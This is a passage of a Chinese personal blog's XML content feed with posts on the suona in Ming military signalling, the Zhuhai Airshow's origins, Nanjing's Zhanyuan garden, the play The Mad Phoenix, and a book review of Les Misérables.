<li><a href="https://artsandculture.google.com/streetview/british-museum/AwEp68JO4NECkQ?sv_h=326&amp;sv_p=0&amp;sv_pid=JeKwUFYAMWXNWPh3IOg3jw&amp;sv_lid=3582009757710443819&amp;sv_lng=-0.12660245092570221&amp;sv_lat=51.51905368906714&amp;sv_z=0.9999999999999997">大英博物馆（谷歌地图在线）</a></li>
</ul>
<h4 id="南京博物院"><a href="#南京博物院" class="headerlink" title="南京博物院"></a>南京博物院</h4><ul>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939537&amp;idx=2&amp;sn=279731816264be7c9780cc58255d1c03&amp;chksm=bd578dc38a2004d5b90d889f6590a83be26c352bc04cdbe184e43fff6b20930326ae01a52b09#rd">旅行指南|江南园林|南京·瞻园</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/iATyqJF6SjfZ18fQz7LgVQ">参观指南|南京博物院</a></p>
</li>
</ul>
<h2 id="生态资源"><a href="#生态资源" class="headerlink" title="生态资源"></a>生态资源</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching-GZ-Wetland/">旅行指南|湿地公园</a></li>
<li><a href="#">旅行指南|地质公园</a>：河南·嵩山</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>摄影</tag>
        <tag>Travel</tag>
      </tags>
  </entry>
  <entry>
    <title>Suona</title>
    <url>/2017/08/20/Artistic-Suona/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>未完成</strong></p>
<a id="more"></a>
<h2 id="唢呐与战争"><a href="#唢呐与战争" class="headerlink" title="唢呐与战争"></a>唢呐与战争</h2><p>名将戚继光在军事著作《纪效新书》中详细描述了唢呐在军队通信系统中的作用：</p>
<blockquote>
<p>凡掌号笛，即是吹锁呐，是要聚官哨队长来分付军中事务。<br>凡正行之间，放铳一个，就是要更变号令，即立定看听有何旗竖、有何令，再行。<br>凡歇处，吹喇叭一荡，火兵即做饭，众人收拾。吹喇叭第二荡，各兵吃饭。吹喇叭第三荡，各兵出赴信地扎营，候主将到，发放施行。<br>凡喇叭吹天鹅声，是要各兵呐喊。<br>凡喇叭吹摆队伍，是要各兵即于行次每哨一聚，各留空地摆定。<br>凡喇叭吹单摆开，是要各队即便挨队甲疏疏摆开，每一小队相平离一丈五尺。<br>凡旗点过，只吹喇叭一长声，是要各兵转身，照旗所向转过。<br>凡打铜锣，是要各兵坐地休息。<br>凡吹哱罗，是要各兵起身，执器械站立。<br>凡点步鼓，是要各兵照先树起的旗次发兵行营，每点鼓一声走十步。<br>凡擂鼓，是要各兵趋跑向前，对敌交锋。<br>凡下营定，擂鼓立中军旗，是放火兵出营樵汲，掌号是收回。<br>凡各举动与交锋，但闻鸣金一声，即便立止；又鸣一声，是要各兵退还；连鸣二声，是要各兵又于脚下便再转身，向前立定。<br>凡打金边，是发人探贼。<br>凡摔钹响，是要各收队，即将原单摆开的兵，照旧收成各哨，再收成每营一处。凡塘报摇小黄旗，是有贼至。</p>
</blockquote>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ctext.org/wiki.pl?if=gb&amp;res=3&amp;remap=gb" target="_blank" rel="noopener">《纪效新书》| 明·戚继光 | 四库全书本</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_c2b02f810102w8pz.html?tj=2" target="_blank" rel="noopener">唢呐：沉沦的宿命｜大象公会</a></li>
<li><a href="http://www.infzm.com/content/125770" target="_blank" rel="noopener">惶惶唢呐匠|南方周末</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>摄影专辑:珠海航空航天展览</title>
    <url>/2016/10/15/Artistic-Zhuhai-AirShow/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>珠海市为何是中国航展举办地？</li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 中国八一飞行表演队 </a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 </a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 英国皇家空军红箭飞行表演队 </a></li>
</ul>
<span id="more"></span>
<p>知乎上有一个问题：珠海市为何是中国航展举办地？</p>
<p>珠海市的地理位置，经济发展水平，政治地位等方面并不具备举办国家级航展的优势条件，20年来很多大城市都跃跃欲试，欲取而代之。它对标的是法国巴黎航展，兼具大规模飞行表演，是目前中国规模最大（北京航展主要以静态站台为主，石家庄航展以通用航空为主）。</p>
<p><img src="http://zhuhai.riboseyim.com/DSC00762-20.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00765-20.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00800-07.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00807-31.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00878.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00886.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00913.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00918.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00920.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00921.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00922.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00924-05.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00927.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00935.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00936.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00937.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00954.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00959-31.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00965-17.JPG-big_1024_logo_300" alt=""><br><img src="http://zhuhai.riboseyim.com/DSC00972-02.JPG-big_1024_logo_300" alt=""></p>
<h2 id="先下手为强"><a href="#先下手为强" class="headerlink" title="先下手为强"></a>先下手为强</h2><p>1992年，珠海政府代表团访问加拿大的苏里市，当时珠海正与之结为姐妹城市。在苏里市的市政厅，梁广大介绍珠海的发展情况，说珠海经济特区要开展铁路、港口、飞机场和大桥等大型设施建设。在市政厅里的会客厅咖啡室，一位议员，马文•亨特，提出建议：“你们建飞机场的时候，能不能把航展的功能考虑进去，我是国际航展成员，国际航空航天博览会是一个很大的商业项目活动，对一个地区，对一个国家都很有好处。”</p>
<p>听着这么像资本市场融资故事呢？机场还没修呢。</p>
<h2 id="4000米跑道"><a href="#4000米跑道" class="headerlink" title="4000米跑道"></a>4000米跑道</h2><p>民航总局批复的规划跑道是2000多米，经过地方政府多次公关，最终民航总局同意批准加建到3200米。如果作为普通的民航机场，一般的机场跑道3200米已经很不错了，但考虑到要建一个国际性机场，跑道短了些，后来又决定加码到了3400米，可以起降波音747等大型客机。最后建设的时候，跑道延伸到了4000米。</p>
<p>当时，全国还没有一个机场拥有4000米的跑道，但这几百米的改动，因为未及时向国家主管部门和国务院报告和审批，导致机场建好后，谁也不敢来验收。各方面的反对意见很多。建那么长干嘛？民航又不需要那么长。最后捅到了国务院办公会议。</p>
<blockquote>
<p>“我向朱镕基总理汇报，超出最初规划建设机场，目的主要是为了办国际航空航天博览会。除了跑道，机场的导航系统、地勤系统，我们采用的都是世界最先进的。”——时任珠海市委书记梁广大</p>
</blockquote>
<p>机智？ 格局 ？ 真相永远不可考。</p>
<p>等级     机场名称                 IATA代码        跑道长度宽度指标（米）<br>4E         珠海三灶(金湾)机场       ZUH            4000×60</p>
<p>4F        北京首都国际机场       PEK            3800×60、3200×50、3800×60<br>4F      上海浦东国际机场  PVG           4000×60、3800×60、3400×60<br>4F        广州白云国际机场    CAN             3800×60、3600×45</p>
<p>4E        长沙黄花国际机场  CSX          3200×60<br>4E        厦门高崎国际机场  XMN          3400×45<br>4E        台湾桃园国际机场    TPE             3660×60、3800×60</p>
<h2 id="特色审批"><a href="#特色审批" class="headerlink" title="特色审批"></a>特色审批</h2><p>机场有了，报批航展的手续也在紧锣密鼓地推进中。梁广大本以为只要珠海市里下定决心举办，再报批一下民航总局，珠海航展的成功就是指日可待。实际上，从1994年1月22日开始，珠海市政府就向国务院请示，在珠海举办中国国际航空航天博览会，直到1995年5月19日，国务院才给予了正式批复。</p>
<p>“后来慢慢才知道，牵扯的部门那么多，有经贸部、贸促会、海关总署、航空工业部、外交部、军委外事部门、总参、空军总部、国防科工委、军委、国务院办公厅、中央办公厅”。梁广大带着一帮人在北京珠海奔波了几乎有一年，拜访了十几个单位，挨家挨户地陈述申办理由。</p>
<p>最难的一关是国防科工委。航展关系到外国飞机和武器的进出，事关领空开放和安全问题，答复批不了，要军委主席才可以批。“总书记的批示让我们举办国际航空航天博览会的工作变得畅通无阻。”</p>
<p>找对人很重要。</p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>综上所述，珠海办航展这事，基本上是梁书记提着脑袋忽悠来的。<br>可是很可惜，第一届航展两年之后，一代能吏梁大胆调职退休，珠海经济特区迎来了漫长的平庸期，直到今天。</p>
<p>历任珠海市委书记<br>任期                             姓名<br>2012.02 - 2016.04   李  嘉 （4年，涉嫌严重违纪，免职）<br>2008.03 - 2012.02    甘   霖（4年）<br>2005.08 - 2008.03    邓维龙（2.5年）<br>2002.08 - 2005.08    方   旋（3年）<br>1998.10 - 2002.08    黄龙云（4年）<br>1987.01 - 1998.09    梁广大（11年，84年任市长）<br>1984.02 - 1987.01    方　苞<br>1979.01 - 1984.02    吴健民</p>
<hr>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="2016年珠海航展图集"><a href="#2016年珠海航展图集" class="headerlink" title="2016年珠海航展图集"></a>2016年珠海航展图集</h4><ul>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 中国八一飞行表演队 </a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 </a></li>
<li><a href="http://www.jianshu.com/p/0d67dc1a0ad4">2016珠海航展 英国皇家空军红箭飞行表演队 </a></li>
</ul>
<h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><ul>
<li><a href="https://images.nasa.gov/#/">NASA 图文资源库</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://twitter.com/i/moments/1141358158809632768">Highlights from the 2019 Paris Air Show</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Artistic</tag>
        <tag>摄影</tag>
        <tag>Sport</tag>
        <tag>讲武堂</tag>
      </tags>
  </entry>
  <entry>
    <title>旅行指南|园林鉴赏</title>
    <url>/2017/01/30/Artistic-Garden/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>南京瞻园</li>
</ul>
<span id="more"></span>
<h4 id="南京瞻园"><a href="#南京瞻园" class="headerlink" title="南京瞻园"></a>南京瞻园</h4><p>瞻园园虽不大，却颇具特色：</p>
<ul>
<li>山水园林：假山、人工湖造型设计艺术</li>
<li>政务园林：江宁布政使司衙门驻地，兼具行政和生活功能</li>
<li>历史园林：太平天国专史博物馆，史料较丰富。</li>
</ul>
<p>瞻园位于南京市秦淮区夫子庙景区，坐北朝南，纵深127米，东西宽123米。是南京现存历史最久的明代古典园林，是江南四大名园。</p>
<p>“瞻园”始建于明朝初年，清朝时为江南布政使办公的地点，太平天国时期为东王杨秀清王府。瞻园历经岁月变迁，多次焚毁、修葺。</p>
<p>“瞻园”的历史可追溯至明太祖朱元璋称帝前的吴王府。明朝初年，朱元璋因念功臣徐达“未有宁居”，特赐予中山王徐达作为府邸花园。经徐氏七世、八世、九世三代人修缮与扩建，至万历年间已初具规模。</p>
<p>乾隆帝巡视江南，曾驻跸此园，并御题“瞻园”匾额。</p>
<p>1853年太平天国定都南京后，“瞻园”先后为东王杨秀清府、夏官副丞相赖汉英衙署和幼西王萧有和府。清同治三年(1864年)，清军夺取天京，该园毁于兵燹。同治四年(1865年)、光绪二十九年(1903年)，“瞻园”两度重修，但已非原园景况。“瞻园”中还辟有太平天国历史博物馆，是唯一的太平天国专史博物馆。</p>
<p>民国时，江苏省长公署、国民政府内政部、水利委员会、中统局特务总部、宪兵司令部看守所等政府机关曾设园内。</p>
<p>1960年，我国著名古建专家刘敦桢教授主持“瞻园”的恢复整建工作。</p>
<p>87年版《红楼梦》，赵雅芝版《新白娘子传奇》的白府取景地（待考证）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-1.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-5.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-6.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-7.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-8.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-9.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-10.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-11.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-12.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-13.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-2.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-3.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Zhanyuan-P-4.png" alt=""></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.ngdsh.org.cn/shngd/2014/yscl/u1ai1846845.html">江南名园——瞻园 | 2016-05-05 王彝伟</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>摄影</tag>
        <tag>Travel</tag>
      </tags>
  </entry>
  <entry>
    <title>豪侠列传：南海十三郎(The Mad Phoenix)</title>
    <url>/2017/04/20/Artistic-The-Mad-Phoenix/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>不写剧评的观众不是好作家。</p>
</blockquote>
<h2 id="看戏也要讲缘分"><a href="#看戏也要讲缘分" class="headerlink" title="看戏也要讲缘分"></a>看戏也要讲缘分</h2><p>记得是小学还是初中的时候，我就在电影频道看过《南海十三郎》（1997拍摄，普通话），当时给我幼小的心灵以极大的震撼。后来到2009年左右，又在网上看过春天话剧社不知某年演出的现场录影版（粤语），更是如获至宝，之后几年好像看了大概二十几遍，越看越有味道。</p>
<p>今年偶然的机会了解到舞台剧版又要巡回演出了，本来打算看5月21日的深圳站，但是因为其它原因没有成行。但是不久之后，又看到了加演广州站的消息，于是早早的买了票，昨天晚上终于在现场看了一遍，也算是了了一桩十几年的夙愿，正所谓念念不忘，必有回响啊。<br><img src="http://upload-images.jianshu.io/upload_images/1037849-9d5ff7d4dd107074.jpg" alt="1997版电影剧照"></p>
<span id="more"></span>
<h3 id="人物关系"><a href="#人物关系" class="headerlink" title="人物关系"></a>人物关系</h3><p>编剧：杜国威<br>主演：谢君豪。<br>年代背景：1920～1980 年代<br>活动地域：<br>广东南海县（今广州荔湾、佛山南海禅城）、上海、香港</p>
<p>南海十三郎：原型江誉镠，粤曲名编剧。<br><img src="http://upload-images.jianshu.io/upload_images/1037849-a54e0bdbaf5a5406.JPG" alt="图片发自简书App"><br>薛觉先：原型薛觉先，粤曲名家，“粤剧伶王”，开创“薛派”。</p>
<p>唐涤生：原型唐涤生，粤曲名编剧，生于珠海唐家湾。代表作《落霞孤鹜》、《紫钗记》、《帝女花》、《蝶影红梨记》、《再世红梅记》。剧中与十三郎亦师亦友，皆是性情中人，对手戏精彩绝伦，不过二人的师徒关系，并无直接史料，为艺术加工。</p>
<p>太史公：十三郎之父。南海巨商、士绅，性豁达、好美食、好戏曲，喜结交各路人物，人称赛孟尝，娶了十二个老婆，子女众多。<br>晚景凄凉，文革中批斗绝食而死。</p>
<p>梅仙：十三郎侄女。家道衰败、流落风尘，后来成为电影明星，与十三郎互有提携，中年重病早逝，逝前皈依宗教。</p>
<p>Lily：上海千金小姐，与十三郎是香港大学同学，舞会上一见倾心，从此牵绊一生。</p>
<p>任惜花：一个很烂的编剧，代表趋炎附势的世俗主义</p>
<p>马老大：一个很烂的戏曲演员、老板</p>
<h3 id="痴情赢得是凄凉"><a href="#痴情赢得是凄凉" class="headerlink" title="痴情赢得是凄凉"></a>痴情赢得是凄凉</h3><p>全场三个小时下来，观众基本上是一路爆笑下来的。<br>但这确实是一部彻彻底底的悲剧，大悲剧。</p>
<p>第一悲：痴情无果，独钓寒江。</p>
<p>一见钟情的人有的是，痴情一生的人不多见。<br><img src="http://upload-images.jianshu.io/upload_images/1037849-3c2d334b45ec9f26.JPG" alt="图片发自简书App"></p>
<blockquote>
<p>心声泪影女儿香，燕归何处觅残塘。<br>红绡夜盗寒江雪，痴人正是十三郎。</p>
</blockquote>
<p>无论是真实的原型，还是剧中人物，无处安放的痴情都化成了剧作家笔下的作品。《寒江钓雪》、《心声泪影》、《梨香院》、《女儿香》、《梁红玉》、《燕归人未归》、《李香君》，哪一部不是有情有义，以情感人，哪一部不是剧作家滴血写成呢？</p>
<p>第二悲：英才折损，浮萍无根。<br>明面上，十三郎和唐涤生一对师徒，一个早逝，一个疯癫，盖世才华宛如流星，人生际遇无不令人唏嘘。暗地里，马老板、任惜花之流却总能如鱼得水、风生水起。</p>
<p>从南国到上海，从北疆到南国，落魄上海，冻死香港，风雨飘摇如浮萍，这就是大时代中的大多数。<br><img src="http://upload-images.jianshu.io/upload_images/1037849-9c50546a9d0226fc.JPG" alt="图片发自简书App"><br>第三悲：家国破败，百年血泪。<br>高门大院的太史第，高官显贵云集，英雄名角际会，蛇羹宴，丝竹局。不起眼的小舞台、小剧社，养活了一帮艺人，也养活了艺术。<br>这些地方不仅有温情的记忆，更是滋养艺术家的沃土。</p>
<p>乱世动荡，府第凋零，舞台不存，也就到了曲终人散，各奔东西的时候了，旧主们只能哀吟“残山梦最真，旧境丢难掉。”  一旦天下承平，自然又会有新主大摆流水席，重现灯红酒绿。</p>
<h3 id="壮怀如我更何人"><a href="#壮怀如我更何人" class="headerlink" title="壮怀如我更何人"></a>壮怀如我更何人</h3><p>全剧写的都是离别情，绕不开的则是家国情怀。<br>虽然出身士绅家庭，在儒家传统的浸染中成长，但是大时代无可避免的在十三郎身上留下烙印。五四运动以来，整个中国的知识阶层都或多或少地受到民族主义潮流的影响，这也就解释了后面的剧情，艺术创作上坚持大仁大义，抗战时期毅然去前线演出，流落香港时调侃讽刺英国总督等等。</p>
<p>本剧的高明之处又在于，主角虽然有浓烈的家国情怀，却始终和政治保持距离，基本上属于边缘中的边缘。这不正是大时代下小人物的真实处境吗？ 中国传统的知识分子，多少都有点以天下为己任的调调，但是鲜有几个人能真的有携天下而行豪气，鲜有几个人能做到视金钱如粪土。且不论有几人可以真的混进体制内，就算是谋得红顶乌纱，也多是为稻梁谋，不倾轧害人已是难得，遑论有所作为。</p>
<h3 id="但愿梦来不必醒"><a href="#但愿梦来不必醒" class="headerlink" title="但愿梦来不必醒"></a>但愿梦来不必醒</h3><p>本剧从始至终，其实隐含着很多处宿命论的调子。<br>例如天才要么早逝、要么疯癫的偈语，三哥浪荡公子、侄女沦落风尘的设定，老揸以声成名、晚年却破声的无奈……</p>
<p>同时，主角在最潦倒之时，依然高举反宗教主义的大旗的。<br>通过这条线索，编剧再次丰富了十三郎的思想内涵：即使是在极端恶劣的生存条件下面， 他并不会屈从于任何权威（这方面如果对于文革史稍有留意的话能更好理解），或者这就是杜国威希望能与“全港编剧共勉”的东西，十三郎不仅具有极高的艺术造诣和品味（对马老板、任惜花之流的极端鄙视），还有自己的一套完整信仰体系，一家价值评判标准，是一个完全独立自由、大写的人。</p>
<p>这一点，通过梅仙的对比，显得更有张力，大多数剧评人并没有关注到。 由于从小缺乏教育、也极度缺乏家庭温情，人生际遇也多是在灯红酒绿的浮夸世界，梅仙是没有机会、也没有意识要去构建自己的心灵世界的。所以，当她不再受宠、远离闪光灯，远离众人的殷勤、独自面对疾病和自己的时候，投入宗教的怀抱，成为无比虔诚的基督徒，也是顺理成章的事。现在大部分的演艺界人士不就喜欢结交仁波切吗？这其实无关智商，越是灯红酒绿的地方，越需要宗教关怀，古今皆然。</p>
<p>总之，十三郎的下半生基本上在疯癫中度过，还好“疯得够清醒”。<br>你说是避世也好，自我麻醉也好，还不如说是自我保护。自我放逐于江湖，远离浊世，远离浊世的人和事，那些积极入世之徒，又有几个能永保赤子之心，他至少可以怀抱“雪上白凤凰”，自己干净。</p>
<h2 id="新版舞台剧的不足"><a href="#新版舞台剧的不足" class="headerlink" title="新版舞台剧的不足"></a>新版舞台剧的不足</h2><h3 id="1-一见倾心过于单薄"><a href="#1-一见倾心过于单薄" class="headerlink" title="1.一见倾心过于单薄"></a>1.一见倾心过于单薄</h3><p>从比重上看，十三郎与Lily的感情戏偏少，上来就一见钟情，处理得太简单，起承转折的节奏也把握得比较零散，过于突兀。这块虽然大体上继承了原版舞台剧、97电影版的底子，但是总感觉这一版的处理不好。也许是我不大喜欢这一版的Lily，呵呵。</p>
<h3 id="2-薛觉先的扮演者"><a href="#2-薛觉先的扮演者" class="headerlink" title="2.薛觉先的扮演者"></a>2.薛觉先的扮演者</h3><p>早先看的现场录影版，薛觉先这个角色的印象很深，到后来才知道，表演者是真正的粤剧演员，印象中已经去世了，可惜！</p>
<p>现在这个版本的扮演者，总体感觉阳刚有余，柔性不足，整体表情偏硬，形象上不似伶人，几段关键的唱腔的味道都不大对。</p>
<h3 id="3-龙套服装设计"><a href="#3-龙套服装设计" class="headerlink" title="3.龙套服装设计"></a>3.龙套服装设计</h3><p>这部舞台剧中的一众龙套其实非常重要，不仅作为“说书人”的角色承上启下，而且还担纲其它多个配角。但是感觉这个版本的服装，设计感觉不太好，一是色调偏暗，二是用了多个色块拼接、感觉花哨，总之是另外比较奇怪。</p>
<h2 id="总评"><a href="#总评" class="headerlink" title="总评"></a>总评</h2><p>个人认为，《南海十三郎》是自昆曲《桃花扇》、小说《红楼梦》以降，以离情写兴亡的惊世之作。<br>限于体裁、篇幅以及语言的关系，虽偏于小众，仍不可忽视作品本身承载的人性关怀和世界格局。</p>
<p>二十几年150多场演出就要划上一个休止符了，希望以后也有好的作品能书写我们这个时代的故事。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-7e96e16a31c87998.JPG" alt="图片发自简书App"></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/Artistic-The-Mad-Phoenix/">舞台剧：南海十三郎</a></li>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/">电影评论|灵魂解码《林肯》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">电影评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/">风月集|诗三百，思无邪</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">江南园林鉴赏|南京瞻园</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/">摄影专辑|珠海航空航天展览</a></li>
</ul>
<h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><p><a href="https://www.gitbook.com/book/riboseyim/art-map">电子书：《香山艺术评论》</a></p>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>世纪小说《悲惨世界》</title>
    <url>/2017/04/13/Artistic-Les-Miserables/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>经济学人：解读世纪小说《悲惨世界》</li>
</ul>
<span id="more"></span>
<h2 id="经济学人：解读世纪小说《悲惨世界》"><a href="#经济学人：解读世纪小说《悲惨世界》" class="headerlink" title="经济学人：解读世纪小说《悲惨世界》"></a>经济学人：解读世纪小说《悲惨世界》</h2><blockquote>
<p>Books and arts  Feb 23rd 2017<br>The Novel of the Century: The Extraordinary Adventure of Les Misérables.<br>By David Bellos. Particular Books; 307 pages; £20.<br>To be published in America by Farrar, Straus &amp; Giroux in March; $27.</p>
</blockquote>
<p>克劳德-米歇尔·勋伯格（Claude-Michel Schönberg，1944年7月6日－），法籍犹太裔唱片录音师、演员、歌手、流行曲和音乐剧作曲家，经常和填词人阿兰·鲍伯利（Alain Boublil）合作。1987年凭借《悲惨世界》获得托尼奖（最佳原创音乐）。</p>
<p>“只要地球上还有无知和贫穷，”维克多·雨果在《悲惨世界》序言中写道，“这样的书就不可能是无用的。” 155年以前，在法国首次出版并传播到其他方，这部小说或者其流行普及本身从未失去它的意义。</p>
<p>《悲惨世界》大约有65个电影版本（最早的版本出现在1909年），使它成为有史以来改变最多的作品。第一阶段，音乐剧于1863年一月在费城开幕。自1980以来，Alain Boublil和Claude-Michel Schönberg合作的音乐歌剧已经在44个国家和349个城市上演了超过53000场次。然而，从一开始，众多的改编者和译者就得从纷繁庞杂的源头中获取素材。英国的爱好者必须等到2008年才有一个完整的英文小说文本，正如原著作者曾经期望的那样。即使对《悲惨世界》的爱好者来说，雨果震惊世界的巨著，感觉就像一个失落的大陆。</p>
<p>大卫·贝洛斯（David Bellos），一个出生于英国的普林斯顿大学法国文学教授，著名的翻译家，通过他的作品我们得以一窥门径，包括五个组成部分，48本书和365章，思路清晰、机智风趣。他既博学又有趣，他揭示了小说的魔力在于它的多种多样功能。雨果的非凡功绩是在拿破仑之后提供一幅“错综复杂的现实主义的法国”，“一个戏剧性的、引人入胜的书” 充满了悬念、演示了一个“慷慨的道德原则”，对今天读者的仍然具有吸引力。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LesMiserable_theme_street.jpge" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/books_the_novel_of_the_century.jpg" alt=""></p>
<p>雨果，当时已经是《巴黎圣母院》的作者，作为诗人、剧作家和小说家的文学巨星，于1845开始写一个前罪犯的故事，一个社会中的穷人和被遗弃者如何寻找新的生活。通过冉阿让（Jean Valjean）的生活轨迹，自1815年从废船监狱释放以来，就使他面临艰难的风险抉择，雨果编织了一个巨大而“非常紧密的“社会冲突与个人新生历程的壁毯。</p>
<p>1848年革命，其中激进的狂热分子发现，“他的头脑是理性的”，虽然他的心是穷人”，打断了雨果的庞大工程。它重新成为流亡作家，被新发迹的皇帝驱逐（拿破仑三世），定居在英属格恩西海峡群岛：不再是“辉煌的野心家”而是一个“独立的抗议者”。</p>
<p>奇怪的是，这个“英国王室的小小的封建前哨”，促成了一本书的孕育和诞生，这本书赢得了全世界的心、促进了思想的改变。珍贵手稿的编辑和打印依赖于维多利亚女王皇家邮政的计划和英属格恩西轮船时刻表。在1861年，“书籍史上最伟大的一笔交易”，雨果获得了相当于20年的主教的薪水：足够“建小铁路”。直到1862年底出版，Charles Wilbour的英文翻译版被报道是“美国历史上最大的书籍订单”。</p>
<p>除了雨果的文学对手（大仲马把它比作“涉水通过泥浆”），每个人都喜欢冉阿让的改过自新历程，众多的各色人物让人很快就进入民俗的世界：街上的女孩梵蒂尼，她的女儿珂赛特，海胆伽弗洛什，学生马吕斯。美国内战期间，删减了谴责奴隶制的内容之后，盗版小说甚至在南方士兵中间广为流传。一个疲惫的双关语冠以他们的指挥官的名字，他们戏称自己是“李的悲惨世界”。（南方指挥官罗伯特-李将军）</p>
